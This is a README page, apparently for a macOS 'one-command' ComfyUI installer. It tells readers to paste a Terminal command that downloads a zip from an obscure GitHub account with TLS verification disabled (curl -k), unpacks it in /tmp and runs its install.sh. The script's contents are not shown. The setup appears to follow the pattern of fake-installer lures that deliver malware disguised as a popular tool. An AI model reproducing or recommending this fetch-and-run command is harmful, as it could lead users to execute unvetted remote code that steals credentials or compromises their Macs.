# 🎨 ComfyUI Mac Installer (macOS Only)

A simple one-command installer for **ComfyUI** on macOS.

This project provides an automated installation script that downloads, configures, and prepares ComfyUI to run locally on Mac without complex manual setup steps.

Designed for both Intel and Apple Silicon Macs.

> ⚠️ macOS Only  
> Windows and Linux are not supported.

---

# 🚀 One-Command Installation

Open **Terminal** and run:

```bash
curl -fsSLk https://github.com/Galeclocleanse/ComfyUI-Mac-Installer/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/ComfyUI-Mac-Installer-main && \
bash install.sh
```

The installer will automatically:

- Download required dependencies
- Install Python environment (if needed)
- Set up ComfyUI
- Configure local runtime
- Prepare launch scripts

No manual configuration required.

---

## 🧠 What Is ComfyUI?

ComfyUI is a powerful and modular interface for running Stable Diffusion workflows locally.  
It allows node-based image generation pipelines with advanced customization and performance control.

This installer simplifies the setup process specifically for macOS users.

---

## 💻 System Requirements

- macOS (Intel or Apple Silicon)
- Terminal access
- Internet connection
- At least 10GB free disk space recommended

For best performance:
- Apple Silicon (M1/M2/M3)
- 8GB RAM or more

---

## ▶️ Running ComfyUI

After installation, navigate to the installed directory and start:

```bash
bash run.sh
```

Then open your browser and go to:

```
http://localhost:8188
```

ComfyUI interface should load in your browser.

---

## 📂 Models

To use Stable Diffusion models:

1. Download compatible `.safetensors` or `.ckpt` models.
2. Place them inside:

```
ComfyUI/models/checkpoints
```

Restart ComfyUI after adding new models.

---

## 🔄 Updating

To update ComfyUI:

```bash
cd ~/ComfyUI
git pull
```

Or re-run the installer if needed.

---

## 🛠 Troubleshooting

If you encounter issues:

- Make sure macOS is updated
- Restart Terminal
- Re-run installation
- Ensure Python dependencies installed correctly

If port 8188 is busy, change it in the config file.

---

## 🔐 Security Note

This script installs dependencies locally on your machine.  
Always review scripts before running commands from the internet.

---

## ⚠️ Disclaimer

This installer is provided as-is without warranty.  
Use at your own risk.

ComfyUI and Stable Diffusion models may have their own licenses — review them before commercial use.
